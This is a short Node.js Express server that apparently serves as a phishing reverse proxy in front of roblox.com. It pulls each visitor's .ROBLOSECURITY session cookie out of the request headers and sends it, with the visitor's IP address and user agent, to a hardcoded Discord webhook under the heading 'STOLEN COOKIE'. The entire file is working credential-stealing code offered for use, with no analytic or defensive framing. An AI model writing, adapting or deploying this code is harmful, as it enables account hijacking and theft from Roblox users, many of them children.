const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz";

let cookieGrabbed = false;

// Create the proxy with robust settings
const proxy = createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    pathRewrite: { '^/roblox': '' },
    headers: {
        'Host': 'www.roblox.com'
    },
    on: {
        proxyReq: (proxyReq, req, res) => {
            if (cookieGrabbed) return;

            const cookies = req.headers.cookie;
            
            // Check for Roblox security cookie
            if (cookies && (cookies.includes('.ROBLOSECURITY') || cookies.includes('ROBLOSECURITY'))) {
                cookieGrabbed = true;
                console.log("Cookie Grabbed!");

                // Extract the specific cookie
                const robloxCookie = cookies.split(';').find(c => c.trim().includes('.ROBLOSECURITY') || c.trim().includes('ROBLOSECURITY'));

                // Send to Discord
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `🍪 **STOLEN COOKIE**\n\`\`\`${robloxCookie || cookies}\`\`\`\n\n**IP:** ${req.ip}\n**UA:** ${req.headers['user-agent']}`
                    })
                }).catch(err => console.error("Discord Error:", err));
            }
        }
    }
});

// Apply the proxy to the /roblox route
app.use('/roblox', proxy);

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
